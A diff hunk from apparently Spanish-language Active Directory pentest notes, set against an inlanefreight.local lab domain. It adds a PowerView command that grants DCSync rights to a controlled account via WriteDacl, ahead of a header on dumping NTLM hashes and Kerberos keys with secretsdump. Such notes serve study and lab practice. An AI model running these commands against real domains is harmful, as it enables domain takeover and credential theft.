@@ -16,6 +16,8 @@ Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType 
 
 SI tenemos permsos sobre el usuario como WriteDacl podemos agregar este privilegio a un user bajo nuestro control.
 
+Add-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync
+
 #######Extraer los hashes NTLM y Kerberos Keys usando secretsdump:
 
 ######linux
